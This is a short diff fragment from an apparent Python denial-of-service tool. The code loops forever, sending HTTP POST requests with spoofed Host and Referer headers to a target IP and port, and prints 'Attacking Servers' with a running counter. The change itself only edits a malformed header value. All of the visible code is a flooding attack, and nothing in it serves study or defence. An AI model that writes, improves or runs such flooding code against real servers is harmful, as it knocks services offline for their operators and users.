@@ -67,7 +67,7 @@ while True:
                 "Referer": f"{res}",
                 "Cache-Control": "no-store, no-cache",
                 "Host": f"{fip}",
-                "GET": " / HTTP/1.1\r\n"
+                "GET": " / HTTP/1.1"
             }
             response = requests.post(url, headers=headers)
             print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
